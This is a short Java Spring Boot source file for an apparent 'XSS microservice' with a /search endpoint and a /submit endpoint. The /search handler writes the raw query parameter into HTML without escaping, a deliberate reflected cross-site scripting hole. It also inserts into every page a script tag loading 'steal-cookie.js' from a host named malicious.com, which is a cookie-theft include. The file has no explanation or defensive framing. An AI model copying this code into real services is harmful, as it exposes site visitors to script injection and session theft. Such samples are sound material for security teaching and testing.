package com.example.xssmicroservice;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.stereotype.Controller;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class XssMicroserviceApplication {
    public static void main(String[] args) {
        SpringApplication.run(XssMicroserviceApplication.class, args);
    }
}

@Controller
class VulnerableController {
    @GetMapping("/search")
    public ResponseEntity<String> search(@RequestParam(name = "query", required = false) String query) {
        StringBuilder html = new StringBuilder();
        html.append("<html><body>");
        html.append("<h2>Search Results for: ").append(query).append("</h2>");
        html.append("<div>You searched for: <b>").append(query).append("</b></div>");
        html.append("<script src='https://malicious.com/steal-cookie.js'></script>");
        html.append("</body></html>");
        return ResponseEntity.ok().header("Content-Type", "text/html").body(html.toString());
    }

    @PostMapping("/submit")
    @ResponseBody
    public Map<String, String> submit(@RequestBody Map<String, String> payload) {
        Map<String, String> response = new HashMap<>();
        response.put("message", "Received: " + payload.get("data"));
        return response;
    }
}

// 模拟框架自动配置
class FrameworkAutoConfig {
    static {
        System.out.println("Auto-configuring security components...");
    }
}